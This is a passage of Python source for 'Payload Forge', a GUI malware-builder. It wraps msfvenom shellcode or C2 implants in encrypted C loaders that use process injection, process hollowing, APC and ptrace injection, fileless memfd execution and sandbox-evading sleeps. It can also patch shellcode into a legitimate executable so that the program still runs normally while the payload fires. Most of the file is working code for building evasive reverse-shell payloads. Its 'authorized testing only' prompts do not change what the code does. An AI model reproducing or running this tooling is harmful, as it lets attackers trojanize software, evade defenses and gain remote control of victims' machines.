        execl("@@DECOYPATH@@", "@@DECOYPATH@@", (char *)NULL);
        _exit(1);
    }
    waitpid(child, &status, 0);            /* stopped before exec */
    ptrace(PTRACE_CONT, child, NULL, NULL);
    waitpid(child, &status, 0);            /* exec SIGTRAP */
    if (!WIFSTOPPED(status)) return;
    ptrace(PTRACE_GETREGS, child, NULL, &regs);
    for (i = 0; i < len; i += sizeof(long)) {
        size_t n = (len - i < sizeof(long)) ? (len - i) : sizeof(long);
        memset(u.b, 0x90, sizeof(u.b));
        memcpy(u.b, sc + i, n);
        ptrace(PTRACE_POKEDATA, child, (void *)(regs.rip + i), (void *)u.v);
    }
    ptrace(PTRACE_CONT, child, NULL, NULL);
    waitpid(child, &status, 0);
}

int main(void) {
    unsigned char *blob;
    blob = malloc(PF_BLOB_LEN);
    if (!blob) return 1;
    memcpy(blob, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(blob, PF_BLOB_LEN);
    pf_sleep();
    pf_inject(blob, PF_BLOB_LEN);
    return 0;
}
'''

IMPLANT_KIND = {
    "Sliver (raw shellcode)": "shellcode",
    "Sliver (shared-lib .so)": "so",
    "Sliver (service exe)": "exe",
    "Havoc (raw shellcode)": "shellcode",
    "Havoc (demon exe)": "exe",
    "Mythic (Athena agent)": "exe",
    "Mythic (Apollo agent)": "exe",
    "Mettle (POSIX meterpreter)": "exe",
}


def platform_of(payload: str) -> str:
    p = payload.strip().lower()
    if p.startswith("windows/"):
        return "Windows"
    if p.startswith("linux/"):
        return "Linux"
    if p.startswith("osx/") or p.startswith("macos/"):
        return "macOS"
    return "Linux"


KIND_OF_EXT = {
    ".bin": "shellcode", ".raw": "shellcode", ".c": "shellcode",
    ".hex": "shellcode", ".txt": "shellcode", ".ps1": "shellcode",
    ".so": "so", ".exe": "exe", ".elf": "exe", ".macho": "exe",
    ".dll": "exe",
}


def kind_of_implant(path: str) -> str:
    return KIND_OF_EXT.get(os.path.splitext(path)[1].lower(), "shellcode")


def parse_shellcode_text(text: str) -> bytes:
    """Accepts: raw hex, C arrays (0xDE,0xAD..), \\x.. strings, base64."""
    t = text.strip()
    if not t:
        return b""
    hexch = re.sub(r"0x", "", t, flags=re.I)
    hexch = re.sub(r"[^0-9a-fA-F]", "", hexch)
    if len(hexch) >= 8 and len(hexch) % 2 == 0:
        try:
            b = bytes.fromhex(hexch)
            if b:
                return b
        except ValueError:
            pass
    try:
        b = base64.b64decode(t, validate=True)
        if b:
            return b
    except Exception:
        pass
    return t.encode("utf-8", "ignore")


def safe_name(s: str) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", s)[:48] or "build"


# ---------------------------------------------------------------------------
# The Forge engine
# ---------------------------------------------------------------------------

class ForgeError(Exception):
    pass


def decrypt_pair(blob: bytes, key: bytes = b"", iv: bytes = b"") -> bytes:
    """Decrypt a MAGIC-prefixed blob produced by Forge.encrypt()."""
    if blob[:4] != MAGIC:
        raise ForgeError("bad blob magic")
    enc_id = blob[4]
    body = blob[5:]
    if enc_id == 0:
        return body
    if enc_id == 1:
        return xor_crypt(body, key)
    if enc_id == 2:
        return rc4_crypt(body, key)
    if enc_id == 3:
        if not shutil.which("openssl"):
            raise ForgeError("AES round-trip needs openssl on PATH")
        p = subprocess.run(["openssl", "enc", "-d", "-aes-128-ctr", "-nopad",
                            "-K", key.hex(), "-iv", iv.hex()],
                           input=body, capture_output=True)
        if p.returncode != 0:
            raise ForgeError("openssl decrypt failed")
        return p.stdout
    raise ForgeError(f"unknown enc_id {enc_id}")


class Forge:
    """Resolves payload bytes (msfvenom or implant file), encrypts, emits
    loader sources + build.sh, and optionally compiles."""

    def __init__(self, log=None):
        self.log = log or (lambda msg: None)

    # -- payload resolution -------------------------------------------------

    def run_msfvenom(self, cfg, outdir) -> bytes:
        exe = shutil.which("msfvenom")
        if not exe:
            raise ForgeError("msfvenom not found on PATH (Kali: `sudo apt install metasploit-framework`)")
        fmt = cfg.get("fmt") or "raw"
        out = os.path.join(outdir, "payload." + safe_name(fmt))
        # strip the GUI's [staged]/[stageless] annotation — msfvenom wants the bare name
        payload_name = cfg["payload"].split(" [")[0].strip()
        cmd = [exe, "-p", payload_name, "-f", fmt, "-o", out]
        if cfg.get("lhost"):
            cmd += [f"LHOST={cfg['lhost']}"]
        if cfg.get("lport"):
            cmd += [f"LPORT={cfg['lport']}"]
        if cfg.get("extra"):
            cmd += cfg["extra"].split()
        if cfg.get("pe_inject"):
            # the payload must not take the host process down when its session ends
            cmd += ["EXITFUNC=thread"]
            self.log("[*] EXITFUNC=thread (PE injection: host process survives session exit)")
        self.log(f"[*] Building MSFvenom payload...")
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        if p.returncode != 0 or not os.path.exists(out):
            tail = (p.stderr or p.stdout or "")[-400:]
            raise ForgeError(f"msfvenom failed: {tail}")
        data = open(out, "rb").read()
        self.log(f"[+] Success! MSFvenom payload size: {len(data)} bytes")
        return data

    def read_implant(self, cfg) -> bytes:
        path = cfg.get("implant_path", "").strip()
        if not path or not os.path.exists(path):
            raise ForgeError(f"implant file not found: {path or '(none given)'}")
        data = open(path, "rb").read()
        if not data:
            raise ForgeError("implant file is empty")
        self.log(f"[*] Reading Payload... {os.path.basename(path)} ({len(data)} bytes, kind={kind_of_implant(path)})")
        if kind_of_implant(path) == "shellcode" and path.lower().endswith((".c", ".hex", ".txt", ".ps1")):
            data = parse_shellcode_text(data.decode("utf-8", "ignore"))
            self.log(f"[+] Parsed shellcode text -> {len(data)} bytes")
        return data

    # -- crypto -------------------------------------------------------------

    def encrypt(self, data: bytes, enc: str):
        """Returns (blob, key, iv, enc_id)."""
        if enc == "XOR Dynamic":
            key = rnd_bytes(16)
            return MAGIC + bytes([1]) + xor_crypt(data, key), key, b"", 1
        if enc == "RC4":
            key = rnd_bytes(16)
            return MAGIC + bytes([2]) + rc4_crypt(data, key), key, b"", 2
        if enc == "AES-CTR (seeded)":
            if not shutil.which("openssl"):
                raise ForgeError("AES-CTR needs the openssl CLI (Kali ships it: sudo apt install openssl)")
            key = rnd_bytes(16)
            iv = rnd_bytes(16)
            p = subprocess.run(["openssl", "enc", "-aes-128-ctr", "-nopad",
                                "-K", key.hex(), "-iv", iv.hex()],
                               input=data, capture_output=True)
            if p.returncode != 0:
                raise ForgeError("openssl AES-CTR failed: " + p.stderr.decode()[:200])
            return MAGIC + bytes([3]) + p.stdout, key, iv, 3
        return MAGIC + bytes([0]) + data, b"", b"", 0

    def decrypt(self, blob: bytes, key: bytes = b"", iv: bytes = b"") -> bytes:
        """Inverse of encrypt() — used by the selftest round-trip."""
        return decrypt_pair(blob, key, iv)

    # -- emission -----------------------------------------------------------

    def decls(self, key: bytes, iv: bytes, blob: bytes, pe: bytes = b"") -> str:
        s = ""
        if key:
            s += c_array(key, "PF_KEY") + f"\n#define PF_KEY_LEN {len(key)}\n"
        if iv:
            s += c_array(iv, "PF_IV") + "\n"
        s += c_array(blob, "PF_BLOB") + f"\n#define PF_BLOB_LEN {len(blob)}\n"
        if pe:
            s += c_array(pe, "PF_PE") + f"\n#define PF_PE_LEN {len(pe)}\n"
        return s

    def build(self, cfg, shellcode: bytes, pe_bytes: bytes = b"") -> str:
        """Emit the loader for cfg. Returns the output directory."""
        target = cfg["target"]
        buildid = "PF-" + rnd_hex(3).upper()
        outdir = os.path.join(OUT_DIR, f"{safe_name(buildid)}-{safe_name(target)}")
        os.makedirs(outdir, exist_ok=True)

        blob, key, iv, enc_id = self.encrypt(shellcode, cfg["enc"])
        self.log(f"[*] Encrypting with {cfg['enc']}" +
                 (f" (key {key.hex()[:12]}...)" if key else ""))

        kind = cfg.get("kind", "shellcode")
        injection = cfg.get("injection", "None")
        pe_on = bool(cfg.get("pe_inject") and pe_bytes)
        sleepms = 45000 if cfg["evasion"] != "None" else 0

        keydecl = ""   # all declarations are emitted inside blobdecl via decls()
        ivdecl = ""
        cipher = blob[5:]          # strip the PFGE tooling header — loader gets pure ciphertext
        blobdecl = self.decls(key, iv, cipher, pe_bytes if pe_on else b"")

        if target == "Windows":
            if kind != "shellcode":
                self.log("[!] Windows target with a compiled implant — ship it raw, or "
                         "use PE injection with a benign host exe instead of wrapping.")
            route_note = injection
            tmpl = (WIN_TEMPLATE
                    .replace("@@EXTRAINC@@", "#include <bcrypt.h>" if enc_id == 3 else "")
                    .replace("@@KEYDECL@@", "")
                    .replace("@@IVDECL@@", "")
                    .replace("@@BLOBDECL@@", blobdecl)
                    .replace("@@PEDECL@@", "")
                    .replace("@@SLEEPCODE@@", WIN_SLEEP if sleepms else "static void pf_sleep(void) {}")
                    .replace("@@DECRYPTCODE@@",
                             WIN_AES if enc_id == 3 else WIN_RC4 if enc_id == 2 else WIN_XOR if enc_id == 1 else WIN_NOCRYPT)
                    .replace("@@EXECROUTE@@", {
                        "CurrentThread": WIN_ROUTE_CURRENT,
                        "Remote Process": WIN_ROUTE_REMOTE,
                        "Process Hollowing": WIN_ROUTE_HOLLOW,
                        "APC Injection": WIN_ROUTE_APC,
                    }.get(injection, WIN_ROUTE_CURRENT))
                    .replace("@@PEINJCODE@@", WIN_RUNPE if pe_on else "")
                    .replace("@@PEDECL@@", "")
                    .replace("@@DISPATCH@@",
                             ("static int pf_dispatch(unsigned char *sc, unsigned int len) {\n"
                              "    return pf_run_pe(sc, len);\n}") if pe_on else
                             ("static int pf_dispatch(unsigned char *sc, unsigned int len) {\n"
                              f"    return {WIN_ROUTE_FUNCS.get(injection, 'pf_current_thread')}(sc, len);\n}}"))
                    .replace("@@MAINCALL@@", "    pf_dispatch(buf, PF_BLOB_LEN);")
                    .replace("@@ROUTENOTE@@", route_note)
                    .replace("@@BUILDID@@", buildid))
            tmpl = tmpl.replace("@@SLEEPMS@@", str(sleepms))
            src_path = os.path.join(outdir, "loader.c")
            open(src_path, "w").write(tmpl)
            buildsh = self.win_buildsh(cfg, outdir)
            note = ""
            if injection.startswith("CurrentThread"):
                note = MITRE_NOTES["CurrentThread"]
            elif injection.startswith("Remote"):
                note = MITRE_NOTES["Remote Process"]
            elif injection.startswith("Process"):
                note = MITRE_NOTES["Process Hollowing"]
            elif injection.startswith("APC"):
                note = MITRE_NOTES["APC Injection"]
            self.log(f"[*] Emitting Windows loader ({injection}" + (" + T1055.002 PE injection" if pe_on else "") + ")")
            if note:
                self.log(f"[i] {note}")
            if pe_on:
                self.log(f"[i] {PE_INJ_NOTE}")

        elif target == "macOS":
            tmpl = (MAC_TEMPLATE
                    .replace("@@EXTRAINC@@", "#include <CommonCrypto/CommonCryptor.h>" if enc_id == 3 else "")
                    .replace("@@KEYDECL@@", "")
                    .replace("@@IVDECL@@", "")
                    .replace("@@BLOBDECL@@", blobdecl)
                    .replace("@@SLEEPCODE@@", POSIX_SLEEP if sleepms else "static void pf_sleep(void) {}")
                    .replace("@@DECRYPTCODE@@",
                             MAC_AES if enc_id == 3 else MAC_RC4 if enc_id == 2 else MAC_XOR if enc_id == 1 else MAC_NOCRYPT)
                    .replace("@@BUILDID@@", buildid)
                    .replace("@@SLEEPMS@@", str(sleepms)))
            open(os.path.join(outdir, "loader.c"), "w").write(tmpl)
            buildsh = self.mac_buildsh(cfg, outdir)
            self.log("[*] Emitting macOS mmap-exec loader (PROT_READ|PROT_EXEC)")

        else:  # Linux
            head = (LIN_COMMON_HEAD
                    .replace("@@EXTRAINC@@", "#include <dlfcn.h>" if kind == "so" else "")
                    .replace("@@KEYDECL@@", "")
                    .replace("@@IVDECL@@", "")
                    .replace("@@BLOBDECL@@", blobdecl)
                    .replace("@@SLEEPCODE@@", POSIX_SLEEP if sleepms else "static void pf_sleep(void) {}")
                    .replace("@@DECRYPTCODE@@",
                             LIN_AES if enc_id == 3 else LIN_RC4 if enc_id == 2 else LIN_XOR if enc_id == 1 else LIN_NOCRYPT)
                    .replace("@@BUILDID@@", buildid))
            if kind == "so":
                body = LIN_SO_MAIN
            elif kind == "exe":
                body = LIN_MEMFD_MAIN.replace("@@DECOYNAME@@", cfg.get("decoy", "systemd-worker"))
            elif injection != "None":
                body = LIN_PTRACE_MAIN.replace("@@DECOYPATH@@", "/usr/bin/sleep")
                self.log("[*] Emitting Linux ptrace injector (T1055.008)")
            else:
                body = LIN_SC_MAIN
            src = (head + body).replace("@@SLEEPMS@@", str(sleepms))
            open(os.path.join(outdir, "loader.c"), "w").write(src)
            buildsh = self.lin_buildsh(cfg, outdir)
            self.log("[*] Emitting Linux loader (" +
                     ("memfd fileless exec" if kind == "exe" else
                      "memfd dlopen" if kind == "so" else
                      "ptrace injection" if injection != "None" else "mmap exec") + ")")

        bsh = os.path.join(outdir, "build.sh")
        open(bsh, "w").write(buildsh)
        os.chmod(bsh, 0o755)

        meta = {
            "build": buildid, "target": target, "payload": cfg.get("payload", ""),
            "implant": cfg.get("implant_path", ""), "kind": kind,
            "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
            "enc": cfg["enc"], "evasion": cfg["evasion"], "injection": injection,
            "pe_inject": pe_on, "x64": bool(cfg.get("x64", True)),
            "shellcode_len": len(shellcode), "blob_len": len(cipher),
            "enc_id": enc_id,
            "key_hex": key.hex(), "iv_hex": iv.hex(),
            "mitre": [m for m in [
                "T1055" if injection.startswith(("Remote", "Current")) else None,
                "T1055.012" if injection.startswith("Process") else None,
                "T1055.004" if injection.startswith("APC") else None,
                "T1055.008" if target == "Linux" and injection != "None" else None,
                "T1055.002" if pe_on else None,
                "T1027" if enc_id else None,
                "T1497.003" if cfg["evasion"] != "None" else None,
            ] if m],
        }
        open(os.path.join(outdir, "manifest.json"), "w").write(json.dumps(meta, indent=2))

        self.try_compile(cfg, outdir)
        self.log(f"[+] Done: {outdir}")
        return outdir

    def try_compile(self, cfg, outdir):
        src = os.path.join(outdir, "loader.c")
        target = cfg["target"]
        if target == "Windows":
            cc = shutil.which("x86_64-w64-mingw32-gcc") if cfg.get("x64", True) else shutil.which("i686-w64-mingw32-gcc")
            if not cc:
                self.log("[!] MinGW-w64 not found — run build.sh after: sudo apt install gcc-mingw-w64")
                return
            libs = "-lbcrypt" if cfg["enc"] == "AES-CTR (seeded)" else ""
            exe = os.path.join(outdir, "payload.exe")
            p = subprocess.run([cc, "-O2", src, "-o", exe] + libs.split(), capture_output=True, text=True)
            if p.returncode == 0:
                self.log(f"[+] Compiled {exe}")
            else:
                self.log("[!] mingw compile failed: " + (p.stderr or "")[-300:])
        elif target == "Linux":
            cc = shutil.which("gcc") or shutil.which("cc")
            if not cc:
                self.log("[!] gcc not found — run ./build.sh after installing build-essential")
                return
            exe = os.path.join(outdir, "payload.elf")
            libs = "-ldl" if cfg.get("kind") == "so" else ""
            p = subprocess.run([cc, "-O2", src, "-o", exe] + libs.split(), capture_output=True, text=True)
            if p.returncode == 0:
                self.log(f"[+] Compiled {exe}")
            else:
                self.log("[!] gcc compile failed: " + (p.stderr or "")[-300:])
        else:
            self.log("[!] macOS Mach-O can't be built from Linux — run build.sh on a mac (clang) or with osxcross")

    def embed_into_pe(self, cfg, shellcode: bytes, host: bytes) -> str:
        """T1055.002 file embedding — the deliverable IS the host executable.
        Appends a .pfsg section to the host PE with the encrypted shellcode and
        an x64 entry stub: stub decrypts the stage, fires it on a second thread
        via CreateThread, then jumps to the original entry point, so the host
        program opens and runs completely normally. No separate loader, no
        spawned process — one file in, one file out."""
        buildid = "PF-" + rnd_hex(3).upper()
        outdir = os.path.join(OUT_DIR, f"{safe_name(buildid)}-PEEmbed")
        os.makedirs(outdir, exist_ok=True)

        enc = "XOR Dynamic"
        if cfg.get("enc", enc) != enc:
            self.log(f"[!] PE embedding uses in-stub XOR (stronger ciphers need a full "
                     f"loader) — building with XOR Dynamic instead of {cfg.get('enc')}")
        key = rnd_bytes(16)
        self.log(f"[*] Encrypting with XOR Dynamic (key {key.hex()[:12]}...)")
        self.log(f"[*] Patching payload into host PE (T1055.002 file embedding)")
        try:
            patched = patch_pe(host, shellcode, key)
        except ForgeError as e:
            self.log(f"[!] {e}")
            raise
        host_name = cfg.get("pe_name") or "host"
        exe = os.path.join(outdir, host_name)
        open(exe, "wb").write(patched)

        meta = {
            "build": buildid, "target": "Windows", "mode": "pe-embed",
            "host": host_name, "payload": cfg.get("payload", ""),
            "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
            "enc": enc, "shellcode_len": len(shellcode),
            "patched_len": len(patched), "host_len": len(host),
            "mitre": ["T1055.002", "T1027"],
            "key_hex": key.hex(),
            "note": "entry -> .pfsg stub: decrypt, CreateThread(shellcode), jmp OEP",
        }
        open(os.path.join(outdir, "manifest.json"), "w").write(json.dumps(meta, indent=2))
        open(os.path.join(outdir, "shellcode.bin"), "wb").write(shellcode)

        self.log(f"[i] {PE_INJ_NOTE}")
        self.log(f"[+] Embedded build: {exe} ({len(patched)} bytes — was {len(host)})")
        self.log(f"[+] Done: {outdir}")
        return outdir

    # -- build.sh writers ----------------------------------------------------

    def win_buildsh(self, cfg, outdir) -> str:
        cc = "x86_64-w64-mingw32-gcc" if cfg.get("x64", True) else "i686-w64-mingw32-gcc"
        libs = "-lbcrypt" if cfg["enc"] == "AES-CTR (seeded)" else ""
        return ("#!/bin/sh\n# Payload Forge build script — AUTHORIZED TESTING ONLY\n"
                f"set -e\n{cc} -O2 loader.c -o payload.exe {libs}\n"
                "echo 'built payload.exe — test in your lab first'\n")

    def mac_buildsh(self, cfg, outdir) -> str:
        arch = "-arch arm64" if not cfg.get("x64", True) else "-arch x86_64"
        return ("#!/bin/sh\n# Build on macOS: clang with Hardware-assisted virtualization off for PROT_EXEC\n"
                "set -e\n"
                f"clang {arch} -O2 loader.c -o payload -Wl,-S\n"
                "codesign -s - payload 2>/dev/null || true\n"
                "echo 'built payload — unsigned, Gatekeeper will ask on first run'\n")

    def lin_buildsh(self, cfg, outdir) -> str:
        libs = "-ldl" if cfg.get("kind") == "so" else ""
        return ("#!/bin/sh\n# Payload Forge build script — AUTHORIZED TESTING ONLY\n"
                f"set -e\ngcc -O2 loader.c -o payload.elf {libs}\n"
                "echo 'built payload.elf'\n")

    # -- orchestrator --------------------------------------------------------

    def run(self, cfg) -> str:
        pe_bytes = b""
        if cfg.get("pe_inject"):
            pp = cfg.get("pe_path", "").strip()
            if not pp or not os.path.exists(pp):
                raise ForgeError("PE injection enabled but no PE file selected")
            pe_bytes = open(pp, "rb").read()
            cfg["pe_name"] = os.path.basename(pp)
            self.log(f"[*] PE injection host: {os.path.basename(pp)} ({len(pe_bytes)} bytes)")

        if cfg["payload_type"] == "MSFvenom":
            cfg["target"] = platform_of(cfg["payload"])
            cfg["kind"] = "shellcode"
            outdir = os.path.join(OUT_DIR, "_stage")
            os.makedirs(outdir, exist_ok=True)
            shellcode = self.run_msfvenom(cfg, outdir)
            if cfg["fmt"] in ("exe", "exe-only", "service", "dll", "msi", "elf", "macho", "so"):
                # msfvenom already wrapped it — ship as-is, no loader needed
                ext = safe_name(cfg["fmt"])
                final = os.path.join(OUT_DIR, safe_name("PF-msf-" + safe_name(cfg["payload"]) + "-" + rnd_hex(2)))
                os.makedirs(final, exist_ok=True)
                shutil.copyfile(os.path.join(outdir, "payload." + ext),
                                os.path.join(final, "payload." + ext))
                open(os.path.join(final, "manifest.json"), "w").write(json.dumps({
                    "build": os.path.basename(final), "target": cfg["target"],
                    "payload": cfg["payload"], "fmt": cfg["fmt"],
                    "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
                }, indent=2))
                self.log(f"[+] Binary format requested — shipped as-is (no loader): {final}")
                return final
            if cfg["fmt"] in ("c", "hex", "powershell", "bash", "python"):
                text = open(os.path.join(outdir, "payload." + safe_name(cfg["fmt"])),
                            "rb").read().decode("utf-8", "ignore")
                shellcode = parse_shellcode_text(text)
        else:
            shellcode = self.read_implant(cfg)
            cfg["kind"] = kind_of_implant(cfg["implant_path"])

        # T1055.002 file embedding: patch the payload INTO the host executable
        if pe_bytes and shellcode:
            return self.embed_into_pe(cfg, shellcode, pe_bytes)

        return self.build(cfg, shellcode, pe_bytes)


# ---------------------------------------------------------------------------
# GUI — layout mirrors the reference screenshot
# ---------------------------------------------------------------------------

BG      = "#2d2d30"   # window background
FG      = "#dcdcdc"   # label text
CONSOLE_BG = "#1e1e1e"

class ForgeGUI:
    def __init__(self, root):
        self.root = root
        self.f = Forge(log=self._log)
        self.q = queue.Queue()
        self.worker = None
        self._authorized = False

        root.title(APP_NAME)
        root.geometry("520x660")
        root.minsize(500, 620)
        root.configure(bg=BG)

        s = ttk.Style()
        try:
            s.theme_use("clam")
        except Exception:
            pass
        s.configure(".", background=BG, foreground=FG,
                    fieldbackground="#3c3c3c", troughcolor="#3c3c3c",
                    bordercolor="#454545", lightcolor="#454545",
                    darkcolor="#2d2d30", selectbackground="#0960a5")
        s.configure("TCombobox", fieldbackground="#3c3c3c", foreground="#000000")
        s.configure("TCheckbutton", background=BG, foreground=FG)
        s.configure("TLabel", background=BG, foreground=FG)
        s.configure("TFrame", background=BG)
        s.configure("TButton", background="#3c3c3c", foreground="#ffffff")
        s.map("TButton", background=[("active", "#0960a5")])

        pad = {"padx": 12, "pady": 3}
        frm = ttk.Frame(root)
        frm.pack(fill="both", expand=True)
        frm.columnconfigure(1, weight=1)

        def lbl(text, row, col=0, sticky="w"):
            ttk.Label(frm, text=text).grid(row=row, column=col, sticky=sticky, **pad)
            return None

        def combo(var, values, row, col=1, width=30):
            cb = ttk.Combobox(frm, textvariable=var, values=values,
                              state="readonly", width=width)
            cb.grid(row=row, column=col, sticky="we", **pad)
            return cb

        # Row 0 — Payload Type
        self.payload_type = tk.StringVar(value="MSFvenom")
        lbl("Payload Type:", 0)
        cb = combo(self.payload_type, ["MSFvenom", "Custom (C2 implant)"], 0)
        cb.bind("<<ComboboxSelected>>", lambda e: self._on_type())

        # Row 1 — msfvenom payload picker (disabled when Custom)
        self.msf_var = tk.StringVar(value=MSF_PAYLOADS[0])
        lbl("Choose MSFvenom payload:", 1)
        self.cb_msf = combo(self.msf_var, MSF_PAYLOADS, 1)

        # Row 2+3 — LHOST / LPORT side by side (two inner frames)
        self.lhost = tk.StringVar(value="192.168.64.128")
        self.lport = tk.StringVar(value="4444")
        lh = ttk.Frame(frm); lh.grid(row=2, column=0, columnspan=2, sticky="we", **pad)
        lh.columnconfigure(1, weight=1); lh.columnconfigure(3, weight=0)
        ttk.Label(lh, text="LHOST:").grid(row=0, column=0, sticky="w")
        ttk.Entry(lh, textvariable=self.lhost, width=20).grid(row=0, column=1, sticky="we", padx=(4, 16))
        ttk.Label(lh, text="LPORT:").grid(row=0, column=2, sticky="e")
        ttk.Entry(lh, textvariable=self.lport, width=8).grid(row=0, column=3, sticky="e", padx=(4, 0))

        # Row 3 — Process Injection
        self.injection = tk.StringVar(value=INJECTION_OPTIONS[1])
        lbl("Process Injection Technique (T1055):", 3)
        combo(self.injection, INJECTION_OPTIONS, 3)

        # Row 4 — PE injection checkbox (matches screenshot)
        self.pe_inject = tk.BooleanVar(value=False)
        ttk.Checkbutton(frm, text="Portable Executable Injection (T1055.002):  " + PE_INJ_FLAG,
                        variable=self.pe_inject,
                        command=self._on_pe_toggle).grid(row=4, column=0, columnspan=2,
                                                          sticky="w", **pad)

        # Row 6 — PE path + Browse (shown only when checkbox on)
        self.pe_path = tk.StringVar(value="")
        self.lbl_pe = ttk.Label(frm, text="Path to PE file:")
        self.ent_pe = ttk.Entry(frm, textvariable=self.pe_path)
        self.btn_pe = ttk.Button(frm, text="Browse", width=10, command=self._browse_pe)

        # Static rows below the optional ones — all gridded by _relayout()
        self.enc = tk.StringVar(value=ENC_OPTIONS[1])
        self.lbl_enc = ttk.Label(frm, text="Payload Encryption:")
        self.cb_enc = ttk.Combobox(frm, textvariable=self.enc, values=ENC_OPTIONS,
                                   state="readonly", width=24)

        self.evasion = tk.StringVar(value=EVASION_OPTIONS[2])
        self.lbl_eva = ttk.Label(frm, text="Sandbox Evasion Technique:")
        self.cb_eva = ttk.Combobox(frm, textvariable=self.evasion, values=EVASION_OPTIONS,
                                   state="readonly", width=24)

        self.x64 = tk.BooleanVar(value=True)
        self.chk_x64 = ttk.Checkbutton(frm, text="Use x64 payload", variable=self.x64)

        self.lbl_con = ttk.Label(frm, text="Building Console")
        self.console = tk.Text(frm, height=11, bg=CONSOLE_BG, fg="#cccccc",
                               insertbackground="#cccccc", state="disabled",
                               wrap="word", relief="flat", padx=6, pady=4)

        self.btn_gen = ttk.Button(frm, text="Generate", command=self._generate)

        # Implant row — created but not gridded; shown when Payload Type = Custom
        self.implant_var = tk.StringVar(value="")
        self.lbl_impl = ttk.Label(frm, text="Implant file:")
        self.ent_impl = ttk.Entry(frm, textvariable=self.implant_var)
        self.btn_impl = ttk.Button(frm, text="Browse", width=10, command=self._browse_implant)

        # Target OS row — only relevant for Custom implants (msfvenom derives
        # the platform from the payload name)
        self.target_var = tk.StringVar(value="Linux")
        self.lbl_target = ttk.Label(frm, text="Target OS:")
        self.cb_target = ttk.Combobox(frm, textvariable=self.target_var,
                                      values=["Windows", "Linux", "macOS"],
                                      state="readonly", width=24)

        # msfvenom format row — also hidden until needed
        self.fmt_var = tk.StringVar(value="raw")
        self.lbl_fmt = ttk.Label(frm, text="MSFvenom -f format:")
        self.cb_fmt = ttk.Combobox(frm, textvariable=self.fmt_var,
                                   values=MSF_FORMATS["Linux"], state="readonly", width=24)

        self._log("[*] Payload Forge ready — AUTHORIZED TESTING ONLY")
        self._on_type()
        self._poll()

    # -- UI callbacks ---------------------------------------------------------

    def _on_type(self):
        t = self.payload_type.get()
        is_msf = (t == "MSFvenom")
        self.cb_msf.configure(state="readonly" if is_msf else "disabled")
        self._relayout()
        self._on_payload()

    def _on_pe_toggle(self):
        self._relayout()

    def _on_payload(self):
        fmts = MSF_FORMATS.get(platform_of(self.msf_var.get()), ["raw"])
        self.cb_fmt.configure(values=fmts)
        if self.fmt_var.get() not in fmts:
            self.fmt_var.set(fmts[0])

    def _relayout(self):
        """Place every row from the optional block down, in toggle order.
        Optional rows (format / implant / target / PE path) appear inline and
        push the static rows (encryption, evasion, x64, console, generate)
        down, so nothing ever overlaps."""
        pad = {"padx": 12, "pady": 3}
        frm = self.console.master
        r = 5
        is_msf = (self.payload_type.get() == "MSFvenom")
        is_custom = (self.payload_type.get() == "Custom (C2 implant)")
        pe_on = self.pe_inject.get()

        if is_msf:
            self.lbl_fmt.grid(row=r, column=0, sticky="w", **pad)
            self.cb_fmt.grid(row=r, column=1, sticky="we", **pad)
            r += 1
        else:
            self.lbl_fmt.grid_forget(); self.cb_fmt.grid_forget()

        if is_custom:
            self.lbl_impl.grid(row=r, column=0, sticky="w", **pad)
            self.ent_impl.grid(row=r, column=1, sticky="we", **pad)
            self.btn_impl.grid(row=r, column=2, sticky="e", padx=(6, 12), pady=3)
            r += 1
            self.lbl_target.grid(row=r, column=0, sticky="w", **pad)
            self.cb_target.grid(row=r, column=1, sticky="we", **pad)
            r += 1
        else:
            for w in (self.lbl_impl, self.ent_impl, self.btn_impl,
                      self.lbl_target, self.cb_target):
                w.grid_forget()

        if pe_on:
            self.lbl_pe.grid(row=r, column=0, sticky="w", **pad)
            self.ent_pe.grid(row=r, column=1, sticky="we", **pad)
            self.btn_pe.grid(row=r, column=2, sticky="e", padx=(6, 12), pady=3)
            r += 1
        else:
            for w in (self.lbl_pe, self.ent_pe, self.btn_pe):
                w.grid_forget()

        # static rows follow in fixed order
        self.lbl_enc.grid(row=r, column=0, sticky="w", **pad)
        self.cb_enc.grid(row=r, column=1, sticky="we", **pad); r += 1
        self.lbl_eva.grid(row=r, column=0, sticky="w", **pad)
        self.cb_eva.grid(row=r, column=1, sticky="we", **pad); r += 1
        self.chk_x64.grid(row=r, column=0, columnspan=2, sticky="w", **pad); r += 1
        self.lbl_con.grid(row=r, column=0, sticky="w", **pad); r += 1
        self.console.grid(row=r, column=0, columnspan=2, sticky="nsew", **pad)
        if getattr(self, "_console_row", None) not in (None, r):
            frm.rowconfigure(self._console_row, weight=0)
        frm.rowconfigure(r, weight=1)
        self._console_row = r
        r += 1
        self.btn_gen.grid(row=r, column=0, columnspan=2, sticky="ew", **pad)

    def _browse_implant(self):
        p = filedialog.askopenfilename(
            title="Pick C2 implant",
            filetypes=[("C2 implants", "*.bin *.raw *.so *.exe *.dll *.macho *.c *.hex *.txt"),
                       ("All files", "*.*")])
        if p:
            self.implant_var.set(p)
            ext = os.path.splitext(p)[1].lower()
            kind = kind_of_implant(p)
            if kind == "shellcode":
                pass
            elif ext == ".so":
                self.target_var.set("Linux")
            elif ext == ".macho":
                self.target_var.set("macOS")
            elif ext in (".exe", ".dll"):
                self.target_var.set("Windows")
            self._log(f"[i] Implant kind: {kind}")

    def _browse_pe(self):
        p = filedialog.askopenfilename(
            title="Pick host executable for PE injection",
            filetypes=[("Executables", "*.exe *.dll"), ("All files", "*.*")])
        if p:
            self.pe_path.set(p)

    def _log(self, msg):
        self.q.put(msg)

    def _poll(self):
        try:
            while True:
                msg = self.q.get_nowait()
                self.console.configure(state="normal")
                self.console.insert("end", msg + "\n")
                self.console.see("end")
                self.console.configure(state="disabled")
        except queue.Empty:
            pass
        self.root.after(120, self._poll)

    def _generate(self):
        if self.worker and self.worker.is_alive():
            messagebox.showwarning(APP_NAME, "A build is already running.")
            return
        if not self._authorized:
            if not messagebox.askyesno(
                    APP_NAME,
                    "Confirm you have written authorization for the targets "
                    "you are about to attack. Continue?"):
                self._log("[!] Build cancelled — no authorization confirmed.")
                return
            self._authorized = True
            self._log("[i] Authorization confirmed for this session.")

        cfg = {
            "payload_type": self.payload_type.get(),
            "payload": self.msf_var.get(),
            "implant_path": self.implant_var.get(),
            "lhost": self.lhost.get().strip(),
            "lport": self.lport.get().strip(),
            "injection": self.injection.get(),
